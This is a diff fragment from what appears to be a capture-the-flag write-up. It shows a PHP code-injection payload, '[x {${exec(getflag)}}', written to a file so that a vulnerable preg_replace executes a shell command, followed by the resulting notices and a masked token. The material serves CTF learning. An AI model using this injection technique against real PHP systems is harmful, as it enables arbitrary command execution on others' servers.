@@ -21,7 +21,7 @@ echo '[x {${exec(getflag)}}' > /tmp/file_cmd
 #what this command does ? {$exec(getflag)} will get the result of the command exec(getflag)
 # {result} will put the result in string format for the echo of php who will print it for us :
 
-PHP Notice: Use of undefined constant getflag ...
+> PHP Notice: Use of undefined constant getflag ...
 #error because getflag is not a defined variable in the php program, we don't care, we just want that
 #the program execute it when it is in the preg_replace
 PHP Notice: Undefined variable: Check flag. Here is your token : ****
